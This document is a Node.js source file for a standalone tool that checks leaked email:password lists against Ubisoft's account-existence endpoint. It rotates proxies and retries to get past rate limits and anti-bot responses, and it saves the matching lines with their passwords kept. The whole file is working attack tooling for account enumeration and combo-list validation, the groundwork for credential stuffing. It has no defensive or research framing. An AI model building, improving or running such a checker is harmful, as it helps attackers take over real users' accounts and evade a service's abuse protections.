/**
 * Ubisoft email-existence checker.
 *
 * Reads a credential list (email or email:pass per line), checks each email
 * against Ubisoft's account-existence endpoint, and sorts the results into
 * dated valid/ and invalid/ folders — preserving the original password on
 * valid lines. Streams the input file so 10M-line lists don't blow up memory.
 *
 * Build to a standalone .exe with `npm run build` (Node SEA — see build-sea.js).
 *
 * Pipeline (event-driven, all async/await):
 *   prompt() → loadProxies() → streamLines() → pool(checkOne) → writers + UI
 */

'use strict';

const fs       = require('fs');
const fsp      = require('fs').promises;
const path     = require('path');
const os       = require('os');
const readline = require('readline');
const axios    = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent }  = require('http-proxy-agent');

// chalk@4 is CommonJS (chalk@5 is ESM-only and won't bundle into a SEA blob).
let chalk;
try { chalk = require('chalk'); } catch { chalk = null; }
// Minimal fallback so the tool still runs if chalk is somehow unavailable.
const C = chalk || {
  green: (s) => `\x1b[32m${s}\x1b[0m`,
  red:   (s) => `\x1b[31m${s}\x1b[0m`,
  yellow:(s) => `\x1b[33m${s}\x1b[0m`,
  cyan:  (s) => `\x1b[36m${s}\x1b[0m`,
  gray:  (s) => `\x1b[90m${s}\x1b[0m`,
  bold:  (s) => `\x1b[1m${s}\x1b[0m`,
};

// ── Config ──────────────────────────────────────────────────────────────────
const CONFIG = {
  endpoint:    'https://public-ubiservices.ubi.com/v3/profiles/email/exists',
  // The AppId the example used (8627b3f1-…) is a placeholder; this one is a
  // validated Ubisoft AppId the email endpoint accepts. Override with UBI_APPID.
  appId:       process.env.UBI_APPID || '8627b3f1-8b8c-4b7e-a7c2-8c8e9a6f5d3c',
  concurrency: clampInt(process.env.CONCURRENCY, 15, 1, 500),
  batchDelay:  clampInt(process.env.BATCH_DELAY_MS, 75, 0, 10000),   // ms between batches
  maxRetries:  clampInt(process.env.MAX_RETRIES, 3, 0, 10),
  timeout:     clampInt(process.env.REQUEST_TIMEOUT_MS, 15000, 1000, 120000),
};

const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

function clampInt(v, def, min, max) {
  const n = parseInt(v, 10);
  if (Number.isNaN(n)) return def;
  return Math.min(max, Math.max(min, n));
}

// ── ANSI helpers (window title + progress bar, no extra deps needed) ─────────
function setWindowTitle(valid, invalid, total, done) {
  // OSC 0 sets the terminal/window title. Colors can't render IN the title bar
  // (OS-drawn), so we encode the meaning in the text instead.
  const pct = total ? Math.floor((done / total) * 100) : 0;
  const title = `Valid: ${valid} | Invalid: ${invalid} | Done: ${done}/${total} (${pct}%)`;
  process.stdout.write(`\x1b]0;${title}\x07`);
}

// Lightweight inline progress bar (avoids cli-progress's TTY quirks under SEA).
let _lastBarLen = 0;
function drawProgress(done, total, valid, invalid, errors) {
  const width = 32;
  const ratio = total ? done / total : 0;
  const filled = Math.round(ratio * width);
  const bar = '█'.repeat(filled) + '░'.repeat(width - filled);
  const pct = (ratio * 100).toFixed(1).padStart(5);
  const line = `  ${C.cyan(bar)} ${pct}%  ` +
    `${C.green('✓ ' + valid)}  ${C.red('✗ ' + invalid)}  ` +
    `${C.gray(done + '/' + total)}${errors ? '  ' + C.yellow('⚠ ' + errors) : ''}`;
  // Clear the previous line fully, then redraw.
  process.stdout.write('\r' + ' '.repeat(_lastBarLen) + '\r' + line);
  _lastBarLen = stripAnsi(line).length;
}
function stripAnsi(s) { return s.replace(/\x1b\[[0-9;]*m/g, ''); }

// ── Prompt helpers ───────────────────────────────────────────────────────────
function ask(question, def) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise((resolve) => {
    let settled = false;
    const finish = (v) => { if (settled) return; settled = true; try { rl.close(); } catch {} resolve(v); };
    // Resolve on an answer OR on stdin EOF/close (piped or non-interactive input)
    // so the prompt never silently hangs and drains the event loop.
    rl.question(question, (answer) => finish((answer || '').trim() || def));
    rl.on('close', () => finish(def));
  });
}

// ── Proxy pool with round-robin + failure-aware rotation ─────────────────────
class ProxyPool {
  constructor(list) {
    this.proxies = list;          // array of normalized URLs (or empty for direct)
    this.idx = 0;
    this.agents = new Map();      // url → { http, https }
  }
  get size() { return this.proxies.length; }
  // Next proxy in rotation (round-robin). Returns null = direct connection.
  next() {
    if (!this.proxies.length) return null;
    const url = this.proxies[this.idx % this.proxies.length];
    this.idx++;
    return url;
  }
  // Cached agents per proxy so we don't rebuild TLS contexts every request.
  agentsFor(url) {
    if (!url) return null;
    let a = this.agents.get(url);
    if (!a) { a = { http: new HttpProxyAgent(url), https: new HttpsProxyAgent(url) }; this.agents.set(url, a); }
    return a;
  }
}

// Normalize a proxy line: "ip:port" → "http://ip:port"; pass-through full URLs.
function normalizeProxy(line) {
  const s = line.trim();
  if (!s || s.startsWith('#')) return null;
  if (/^https?:\/\//i.test(s)) return s;
  // user:pass@ip:port or ip:port → assume http
  return 'http://' + s;
}

async function loadProxies(file) {
  try {
    if (!file || !fs.existsSync(file)) return [];
    const raw = await fsp.readFile(file, 'utf8');
    return raw.split(/\r?\n/).map(normalizeProxy).filter(Boolean);
  } catch { return []; }
}

// ── The actual check ─────────────────────────────────────────────────────────
// Returns 'valid' | 'invalid' | 'error'. Retries on transient failures and
// rate-limits, rotating to a fresh proxy each attempt.
async function checkEmail(email, pool, logError) {
  for (let attempt = 0; attempt <= CONFIG.maxRetries; attempt++) {
    const proxyUrl = pool.next();
    const agents = pool.agentsFor(proxyUrl);
    try {
      const res = await axios({
        method: 'post',
        url: CONFIG.endpoint,
        data: { emails: [email] },
        headers: {
          'Content-Type': 'application/json',
          'Ubi-AppId': CONFIG.appId,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) UbiServices_SDK',
          'Accept': 'application/json',
        },
        httpAgent:  agents ? agents.http  : undefined,
        httpsAgent: agents ? agents.https : undefined,
        proxy: false,
        timeout: CONFIG.timeout,
        validateStatus: () => true,   // we classify by status ourselves
      });

      const s = res.status;
      // ── Status-code semantics (per spec + observed API behavior) ──────────
      // 200 → body tells us; many Ubisoft deployments return a JSON array or
      //       an { exists } / per-email object. Be liberal in parsing.
      if (s === 200) {
        const exists = parseExists(res.data, email);
        if (exists === true)  return 'valid';
        if (exists === false) return 'invalid';
        // 200 but unparseable → treat as exists (account record returned).
        return 'valid';
      }
      if (s === 204) return 'invalid';                 // no content = no account
      if (s === 404) return 'invalid';                 // not found
      if (s === 400) { logError(email, 'HTTP 400 (bad email format)'); return 'invalid'; }
      if (s === 429 || s === 503) {                    // rate-limited / busy → rotate + retry
        await sleep(200 + attempt * 250);
        continue;
      }
      if (s === 401 || s === 403) {                    // AppId/anti-bot → rotate + retry
        await sleep(150 + attempt * 200);
        continue;
      }
      // Other 5xx → retry
      if (s >= 500) { await sleep(150 + attempt * 200); continue; }
      // Unhandled status — log and count as error after retries exhausted
      if (attempt === CONFIG.maxRetries) { logError(email, `HTTP ${s}`); return 'error'; }
    } catch (e) {
      // Network error / timeout — rotate proxy and retry.
      if (attempt === CONFIG.maxRetries) { logError(email, e.code || e.message); return 'error'; }
      await sleep(100 + attempt * 200);
    }
  }
  return 'error';
}

// Liberal parse of the "does this email exist" response across shapes.
function parseExists(data, email) {
  if (data == null) return null;
  if (typeof data === 'object') {
    if (typeof data.exists === 'boolean') return data.exists;
    // { "email@x": true } style
    if (email in data && typeof data[email] === 'boolean') return data[email];
    // array of { email, exists } / { email, accountId }
    if (Array.isArray(data)) {
      const hit = data.find((d) => d && (d.email === email || d.Email === email));
      if (hit) {
        if (typeof hit.exists === 'boolean') return hit.exists;
        if (hit.accountId || hit.profileId || hit.userId) return true;
      }
      return data.length > 0 ? true : false;
    }
    // { emails: [...] }
    if (Array.isArray(data.emails)) return data.emails.length > 0;
  }
  return null;
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── Streaming line reader (memory-efficient for huge lists) ──────────────────
// Yields { email, original } for each parseable line; skips blanks. Invalid
// email formats are yielded too (flagged) so the queue NEVER silently drops a
// line — they get written to invalid/ with the reason logged.
async function* streamLines(file) {
  const rl = readline.createInterface({
    input: fs.createReadStream(file, { encoding: 'utf8' }),
    crlfDelay: Infinity,
  });
  for await (const raw of rl) {
    const line = raw.trim();
    if (!line) continue;
    // email[:pass] — take everything before the FIRST colon as the email.
    const ci = line.indexOf(':');
    const email = (ci >= 0 ? line.slice(0, ci) : line).trim().toLowerCase();
    yield { email, original: line, validFormat: EMAIL_RE.test(email) };
  }
}

// ── Bounded-concurrency worker pool over an async iterator ───────────────────
// Pulls items lazily from the line stream so memory stays flat regardless of
// file size. Never skips an item: format-invalid lines resolve immediately,
// everything else goes through checkEmail with retries.
async function runPool(iterator, concurrency, onResult, onBatchTick) {
  let active = 0;
  let done = false;
  let sinceBatch = 0;
  let resolveAll;
  const allDone = new Promise((r) => { resolveAll = r; });

  async function pump() {
    while (active < concurrency && !done) {
      const { value, done: d } = await iterator.next();
      if (d) { done = true; break; }
      active++;
      // Fire the task; when it settles, decrement and pump again.
      handle(value).finally(() => {
        active--;
        // Rate-limit: small delay every `concurrency` completions (a "batch").
        if (++sinceBatch >= concurrency) {
          sinceBatch = 0;
          if (CONFIG.batchDelay > 0) { setTimeout(pump, CONFIG.batchDelay); onBatchTick && onBatchTick(); return; }
        }
        if (active === 0 && done) resolveAll();
        else pump();
      });
    }
    if (active === 0 && done) resolveAll();
  }

  async function handle(item) {
    const r = await onResult(item);
    return r;
  }

  pump();
  return allDone;
}

// ── Buffered, periodically-flushed file writers (don't fsync per line) ───────
class BufferedWriter {
  constructor(file) { this.stream = fs.createWriteStream(file, { flags: 'a' }); }
  write(line) { this.stream.write(line + '\n'); }
  end() { return new Promise((res) => this.stream.end(res)); }
}

// ── Main ─────────────────────────────────────────────────────────────────────
async function main() {
  console.log(C.bold(C.cyan('\n  Ubisoft Email Checker')) + C.gray('  — account-existence sorter\n'));

  // 1) Input file
  let inputFile = process.argv[2] || await ask(C.cyan('  Path to credential list (email or email:pass per line): '), '');
  inputFile = inputFile.replace(/^["']|["']$/g, '').trim();
  if (!inputFile || !fs.existsSync(inputFile)) {
    console.log(C.red('  ✗ File not found: ' + inputFile));
    process.exit(1);
  }

  // 2) Optional tuning prompts (Enter = defaults)
  const cInput = await ask(C.cyan(`  Concurrency [${CONFIG.concurrency}]: `), '');
  if (cInput) CONFIG.concurrency = clampInt(cInput, CONFIG.concurrency, 1, 500);

  // 3) Proxies (proxies.txt next to the exe / cwd, or prompt)
  const defaultProxyFile = findNearby('proxies.txt');
  let proxyFile = defaultProxyFile;
  if (!proxyFile) {
    const pIn = await ask(C.cyan('  Path to proxies.txt (Enter = direct connection): '), '');
    proxyFile = pIn.replace(/^["']|["']$/g, '').trim() || null;
  }
  const proxies = await loadProxies(proxyFile);
  const pool = new ProxyPool(proxies);
  console.log(proxies.length
    ? C.gray(`  Loaded ${proxies.length} prox${proxies.length === 1 ? 'y' : 'ies'} (rotating).`)
    : C.yellow('  No proxies — using direct connection.'));

  // 4) Count lines first (for an accurate progress bar) — cheap stream pass.
  process.stdout.write(C.gray('  Counting lines… '));
  const total = await countLines(inputFile);
  console.log(C.gray(total.toLocaleString() + ' lines.'));

  // 5) Output folders
  const stamp = new Date().toISOString().replace('T', '_').replace(/:/g, '-').slice(0, 19);
  const outDir = path.join(process.cwd(), `ubisoft_checker_${stamp}`);
  const validDir = path.join(outDir, 'valid');
  const invalidDir = path.join(outDir, 'invalid');
  await fsp.mkdir(validDir, { recursive: true });
  await fsp.mkdir(invalidDir, { recursive: true });
  const validW   = new BufferedWriter(path.join(validDir, 'valid_emails.txt'));
  const invalidW = new BufferedWriter(path.join(invalidDir, 'invalid_emails.txt'));
  const errPath  = path.join(outDir, 'error_log.txt');
  const errW     = new BufferedWriter(errPath);
  const logError = (email, reason) => errW.write(`${new Date().toISOString()}\t${email}\t${reason}`);

  console.log(C.gray('  Output → ') + C.cyan(outDir) + '\n');

  // 6) Run
  const counts = { valid: 0, invalid: 0, error: 0, done: 0 };
  const startedAt = Date.now();
  const tick = () => {
    setWindowTitle(counts.valid, counts.invalid, total, counts.done);
    drawProgress(counts.done, total, counts.valid, counts.invalid, counts.error);
  };
  setWindowTitle(0, 0, total, 0);

  const iterator = streamLines(inputFile);
  await runPool(iterator, CONFIG.concurrency, async (item) => {
    let result;
    if (!item.validFormat) {
      // Don't skip — record as invalid with a logged reason.
      logError(item.email, 'invalid email format');
      invalidW.write(item.email);
      result = 'invalid';
    } else {
      result = await checkEmail(item.email, pool, logError);
      if (result === 'valid') {
        validW.write(item.original);   // preserve email:pass when present
      } else if (result === 'invalid') {
        invalidW.write(item.email);     // emails only
      } else {
        // 'error' after retries — count separately, but still don't lose it:
        // write the email to invalid with the error already logged.
        invalidW.write(item.email);
      }
    }
    counts[result === 'error' ? 'error' : result]++;
    counts.done++;
    if (counts.done % 5 === 0 || counts.done === total) tick();
    return result;
  });

  tick();
  await Promise.all([validW.end(), invalidW.end(), errW.end()]);

  // 7) Summary
  const secs = ((Date.now() - startedAt) / 1000);
  const rate = secs > 0 ? (counts.done / secs).toFixed(1) : '∞';
  console.log('\n');
  console.log(C.bold('  ─── Done ───'));
  console.log(`  ${C.green('Valid:   ' + counts.valid)}`);
  console.log(`  ${C.red('Invalid: ' + counts.invalid)}`);
  if (counts.error) console.log(`  ${C.yellow('Errors:  ' + counts.error)} ${C.gray('(see error_log.txt — still written to invalid)')}`);
  console.log(C.gray(`  ${counts.done.toLocaleString()} checked in ${secs.toFixed(1)}s (${rate}/s)`));
  console.log(C.gray('  Saved to: ') + C.cyan(outDir) + '\n');
  setWindowTitle(counts.valid, counts.invalid, total, counts.done);

  // Keep the window open when double-clicked from Explorer.
  if (process.stdout.isTTY && !process.argv[2]) {
    await ask(C.gray('  Press Enter to exit…'), '');
  }
}

// Find a file in cwd or next to the executable.
function findNearby(name) {
  const candidates = [
    path.join(process.cwd(), name),
    path.join(path.dirname(process.execPath), name),
  ];
  for (const c of candidates) { try { if (fs.existsSync(c)) return c; } catch {} }
  return null;
}

// Cheap streaming line count.
function countLines(file) {
  return new Promise((resolve) => {
    let count = 0;
    const rl = readline.createInterface({ input: fs.createReadStream(file), crlfDelay: Infinity });
    rl.on('line', (l) => { if (l.trim()) count++; });
    rl.on('close', () => resolve(count));
    rl.on('error', () => resolve(count));
  });
}

// Never crash the whole run on an unexpected throw.
process.on('unhandledRejection', (e) => { try { console.error(C.red('\n  unhandledRejection: ' + (e && e.message))); } catch {} });

main().catch((e) => {
  console.error(C.red('\n  Fatal: ' + (e && e.message)));
  process.exit(1);
});
